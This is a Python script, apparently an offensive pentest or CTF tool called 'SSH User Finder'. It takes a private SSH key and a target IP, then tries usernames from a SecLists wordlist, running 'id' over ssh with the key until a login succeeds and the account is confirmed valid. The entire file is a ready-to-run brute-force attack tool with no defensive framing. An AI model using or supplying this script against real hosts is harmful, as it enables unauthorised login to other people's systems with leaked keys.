#!/usr/bin/env python3

# This script is used to search for a valid user by means of an id_rsa file.
# By default it uses the names.txt dictionary from seclists, if you don't have seclists you can install it as follows: sudo apt install seclists.

import argparse
import subprocess
import os

y = '\033[93m'
r = '\033[91m'
g = '\033[92m'
reset = '\033[0m'

def check_user(username, key_path, rhost):
    try:
        subprocess.run(['ssh', '-i', key_path, f'{username}@{rhost}', '-x', 'id'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return True
    except subprocess.CalledProcessError:
        return False

def print_banner():
    banner = """
   ______  ______
  / __/ / / / __/
 _\ \/ /_/ / _/
/___/\____/_/

(SSH User Finder)
"""
    print(f"{g}{banner}{reset}")

def main():
    print_banner()

    parser = argparse.ArgumentParser()
    parser.add_argument('-k', '--rsakey', help="File path id_rsa", required=True)
    parser.add_argument('-w', '--wordlist', help="Path to the user list file", default='/usr/share/seclists/Usernames/Names/names.txt', required=False)
    parser.add_argument('-t', '--target', help="Target IP address", required=True)
    args = parser.parse_args()

    key_path = args.rsakey
    users_file = args.wordlist
    rhost = args.target

    with open(users_file, 'r') as file:
        users = file.read().splitlines()

    user_found = False

    for user in users:
        print(f"[{y}*{reset}] Testing user: {y}{user}{reset}", end='\r')
        if check_user(user, key_path, rhost):
            print(f"\n[{g}+{reset}] User: {g}{user}{reset} is valid!")
            user_found = True
            break

    if not user_found:
        print(f"\n[{r}!{reset}] {r}No user found...{reset}")

if __name__ == "__main__":
    main()
